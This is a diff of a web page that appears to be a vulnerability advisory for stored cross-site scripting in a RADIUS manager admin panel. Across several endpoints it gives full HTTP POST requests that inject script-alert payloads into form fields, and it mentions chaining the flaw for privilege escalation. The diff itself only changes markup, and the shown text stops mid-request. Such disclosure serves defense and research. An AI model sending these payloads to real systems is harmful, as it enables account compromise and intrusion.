@@ -55,6 +55,10 @@ This may be used as a means to elevate privileges when chained together with CVE
   <link rel="stylesheet" type="text/css" href="/css/styles.css">
 
   
+    <link rel="stylesheet" href="/css/custom_01.css">
+  
+    <link rel="stylesheet" href="/css/custom_02.css">
+  
 
   
   
@@ -276,324 +280,329 @@ This may be used as a means to elevate privileges when chained together with CVE
 </ul>
 <p>The following are the HTTP request fields which can exploit this vulnerability across the different listed endpoints:</p>
 <h3 id="adding-manager-account-request">Adding Manager Account Request</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /admin.php?cont=store_manager <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
-Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
-User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
-Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
-Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
-Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
-Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
-Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">406</span>
-Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
-DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
-Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/admin.php?cont=new_manager</span>
-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
-Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+<pre><code class="language-http">POST /admin.php?cont=store_manager HTTP/1.1
+Host: radmandemo.dmasoftlab.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 406
+Origin: http://radmandemo.dmasoftlab.com
+DNT: 1
+Connection: keep-alive
+Referer: http://radmandemo.dmasoftlab.com/admin.php?cont=new_manager
+Cookie: PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
 
 enablemanager=1&amp;managername=script&amp;password1=admin&amp;password2=admin&amp;firstname=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;company=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;address=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;city=&amp;zip=&amp;country=&amp;state=&amp;phone=&amp;mobile=&amp;email=&amp;vatid=&amp;lang=English&amp;comment=&amp;Submit=Add+manager
-</code></pre></div><h3 id="adding-access-points">Adding Access Points</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /admin.php?cont=store_ap <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
-Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
-User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
-Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
-Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
-Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
-Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
-Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">190</span>
-Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
-DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
-Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/admin.php?cont=new_ap</span>
-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
-Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</code></pre>
+<h3 id="adding-access-points">Adding Access Points</h3>
+<pre><code class="language-http">POST /admin.php?cont=store_ap HTTP/1.1
+Host: radmandemo.dmasoftlab.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 190
+Origin: http://radmandemo.dmasoftlab.com
+DNT: 1
+Connection: keep-alive
+Referer: http://radmandemo.dmasoftlab.com/admin.php?cont=new_ap
+Cookie: PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
 
 ​enable=1&amp;name=name&amp;ip=192.168.1.254&amp;accessmode=0&amp;community=Name&amp;apiusername=Name&amp;apipassword=Name&amp;apiver=0&amp;description=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;Submit=Store+AP&amp;id=
-</code></pre></div><h3 id="adding-nas">Adding NAS</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /admin.php?cont=store_nas <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
-Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
-User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
-Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
-Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
-Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
-Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
-Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">166</span>
-Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
-DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
-Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/admin.php?cont=new_nas</span>
-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
-Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</code></pre>
+<h3 id="adding-nas">Adding NAS</h3>
+<pre><code class="language-http">POST /admin.php?cont=store_nas HTTP/1.1
+Host: radmandemo.dmasoftlab.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 166
+Origin: http://radmandemo.dmasoftlab.com
+DNT: 1
+Connection: keep-alive
+Referer: http://radmandemo.dmasoftlab.com/admin.php?cont=new_nas
+Cookie: PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
 
 name=Name&amp;nasip=192.168.1.198&amp;type=0&amp;secret=Name&amp;coamode=0&amp;apiusername=&amp;apipassword=&amp;apiver=0&amp;descr=%3Cscript%3Ealert%28%22xss+1d8%22%29%3C%2Fscript%3E&amp;Submit=Add+NAS
-</code></pre></div><h3 id="adding-service-plans">Adding Service Plans</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /admin.php?cont=store_service <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
-Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
-User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
-Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
-Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
-Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
-Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=---------------------------408088260618922419663198838811</span>
-Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">6939</span>
-Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
-DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
-Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/admin.php?cont=new_service</span>
-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
-Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</code></pre>
+<h3 id="adding-service-plans">Adding Service Plans</h3>
+<pre><code class="language-http">POST /admin.php?cont=store_service HTTP/1.1
+Host: radmandemo.dmasoftlab.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------408088260618922419663198838811
+Content-Length: 6939
+Origin: http://radmandemo.dmasoftlab.com
+DNT: 1
+Connection: keep-alive
+Referer: http://radmandemo.dmasoftlab.com/admin.php?cont=new_service
+Cookie: PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
 
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;srvname&#34;
+Content-Disposition: form-data; name=&quot;srvname&quot;
 
-&lt;script&gt;alert(&#34;xss 1d8&#34;)&lt;/script&gt;
+&lt;script&gt;alert(&quot;xss 1d8&quot;)&lt;/script&gt;
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;descr&#34;
+Content-Disposition: form-data; name=&quot;descr&quot;
 
-&lt;script&gt;alert(&#34;xss 1d8&#34;)&lt;/script&gt;
+&lt;script&gt;alert(&quot;xss 1d8&quot;)&lt;/script&gt;
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;enableservice&#34;
+Content-Disposition: form-data; name=&quot;enableservice&quot;
 
 1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;srvtype&#34;
+Content-Disposition: form-data; name=&quot;srvtype&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;downrate&#34;
+Content-Disposition: form-data; name=&quot;downrate&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;uprate&#34;
+Content-Disposition: form-data; name=&quot;uprate&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;policymapdl&#34;
+Content-Disposition: form-data; name=&quot;policymapdl&quot;
 
 
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;policymapul&#34;
+Content-Disposition: form-data; name=&quot;policymapul&quot;
 
 
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;dlquota&#34;
+Content-Disposition: form-data; name=&quot;dlquota&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;ulquota&#34;
+Content-Disposition: form-data; name=&quot;ulquota&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;combquota&#34;
+Content-Disposition: form-data; name=&quot;combquota&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;timequota&#34;
+Content-Disposition: form-data; name=&quot;timequota&quot;
 
 00:00:00
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;dlburstlimit&#34;
+Content-Disposition: form-data; name=&quot;dlburstlimit&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;ulburstlimit&#34;
+Content-Disposition: form-data; name=&quot;ulburstlimit&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;dlburstthreshold&#34;
+Content-Disposition: form-data; name=&quot;dlburstthreshold&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;ulburstthreshold&#34;
+Content-Disposition: form-data; name=&quot;ulburstthreshold&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;dlbursttime&#34;
+Content-Disposition: form-data; name=&quot;dlbursttime&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;ulbursttime&#34;
+Content-Disposition: form-data; name=&quot;ulbursttime&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;priority&#34;
+Content-Disposition: form-data; name=&quot;priority&quot;
 
 8
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;poolname&#34;
+Content-Disposition: form-data; name=&quot;poolname&quot;
 
 
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;disnextsrvid&#34;
+Content-Disposition: form-data; name=&quot;disnextsrvid&quot;
 
 -1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;nextsrvid&#34;
+Content-Disposition: form-data; name=&quot;nextsrvid&quot;
 
 -1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;dailynextsrvid&#34;
+Content-Disposition: form-data; name=&quot;dailynextsrvid&quot;
 
 -1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;custattr&#34;
+Content-Disposition: form-data; name=&quot;custattr&quot;
 
 
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;cmcfg&#34;
+Content-Disposition: form-data; name=&quot;cmcfg&quot;
 
 
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;allowednases[]&#34;
+Content-Disposition: form-data; name=&quot;allowednases[]&quot;
 
 3
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;allowednases[]&#34;
+Content-Disposition: form-data; name=&quot;allowednases[]&quot;
 
 1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;allowednases[]&#34;
+Content-Disposition: form-data; name=&quot;allowednases[]&quot;
 
 5
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;allowednases[]&#34;
+Content-Disposition: form-data; name=&quot;allowednases[]&quot;
 
 2
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;allowedmanagers[]&#34;
+Content-Disposition: form-data; name=&quot;allowedmanagers[]&quot;
 
 admin
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;allowedmanagers[]&#34;
+Content-Disposition: form-data; name=&quot;allowedmanagers[]&quot;
 
 manager1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;unitprice&#34;
+Content-Disposition: form-data; name=&quot;unitprice&quot;
 
 0.000000
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;taxpercent&#34;
+Content-Disposition: form-data; name=&quot;taxpercent&quot;
 
 11.00
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;unitpricegross&#34;
+Content-Disposition: form-data; name=&quot;unitpricegross&quot;
 
 0.000000
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;unitpricetax&#34;
+Content-Disposition: form-data; name=&quot;unitpricetax&quot;
 
 0.000000
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;unitpriceadd&#34;
+Content-Disposition: form-data; name=&quot;unitpriceadd&quot;
 
 0.000000
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;unitpriceaddgross&#34;
+Content-Disposition: form-data; name=&quot;unitpriceaddgross&quot;
 
 0.000000
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;unitpriceaddtax&#34;
+Content-Disposition: form-data; name=&quot;unitpriceaddtax&quot;
 
 0.000000
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;timeaddmodeexp&#34;
+Content-Disposition: form-data; name=&quot;timeaddmodeexp&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;timeaddmodeonline&#34;
+Content-Disposition: form-data; name=&quot;timeaddmodeonline&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;trafficaddmode&#34;
+Content-Disposition: form-data; name=&quot;trafficaddmode&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;timeunitexp&#34;
+Content-Disposition: form-data; name=&quot;timeunitexp&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;inittimeexp&#34;
+Content-Disposition: form-data; name=&quot;inittimeexp&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;timebaseexp&#34;
+Content-Disposition: form-data; name=&quot;timebaseexp&quot;
 
 2
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;timeunitonline&#34;
+Content-Disposition: form-data; name=&quot;timeunitonline&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;inittimeonline&#34;
+Content-Disposition: form-data; name=&quot;inittimeonline&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;timebaseonline&#34;
+Content-Disposition: form-data; name=&quot;timebaseonline&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;trafficunitdl&#34;
+Content-Disposition: form-data; name=&quot;trafficunitdl&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;initdl&#34;
+Content-Disposition: form-data; name=&quot;initdl&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;trafficunitul&#34;
+Content-Disposition: form-data; name=&quot;trafficunitul&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;initul&#34;
+Content-Disposition: form-data; name=&quot;initul&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;trafficunitcomb&#34;
+Content-Disposition: form-data; name=&quot;trafficunitcomb&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;inittotal&#34;
+Content-Disposition: form-data; name=&quot;inittotal&quot;
 
 0
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;minamount&#34;
+Content-Disposition: form-data; name=&quot;minamount&quot;
 
 1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;addamount&#34;
+Content-Disposition: form-data; name=&quot;addamount&quot;
 
 1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;minamountadd&#34;
+Content-Disposition: form-data; name=&quot;minamountadd&quot;
 
 1
 -----------------------------408088260618922419663198838811
-Content-Disposition: form-data; name=&#34;Submit&#34;
+Content-Disposition: form-data; name=&quot;Submit&quot;
 
 Store service
 -----------------------------408088260618922419663198838811--
-</code></pre></div><h3 id="adding-user-accounts">Adding User Accounts</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /user.php?cont=update_user <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
-Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">radmandemo.dmasoftlab.com</span>
-User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span>
-Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
-Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
-Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
-Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
-Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">240</span>
-Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com</span>
-DNT<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
-Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://radmandemo.dmasoftlab.com/user.php?cont=edit_user</span>
-Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=1u7c5e6hnobson7n53vt7o3vq3; listusers_ordercol=username; listusers_ordertype=ASC; newuser_acctype=0; login_admin=admin; login_user=user; lstinv_trtype=0; lstinv_pmstatus=-1; lstinv_trusr=1; lstinv_trman=1; lstinv_paymode0=1; lstinv_paymode1=1; lstinv_paymode2=1; lstinv_paymode3=1; lstinv_paymode4=1; lstinv_paymode5=1; lstinv_paymode6=1; lstinv_paymode7=1; lstinv_paymode8=1; lstinv_paymode9=1; lstinv_paymode10=1; lstinv_paymode11=1; lstinv_paymode12=1; lstinv_paymode13=1</span>
-Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
-Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</code></pre>
+<h3 id="adding-user-accounts">Adding User Accounts</h3>
+<pre><code class="language-http">POST /user.php?cont=update_user HTTP/1.1
+Host: radmandemo.dmasoftlab.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 240
+Origin: http://radmandemo.dmasoftlab.com
+DNT: 1
+Connection: keep-alive
+Referer: http://radmandemo.dmasoftlab.com/user.php?cont=edit_user
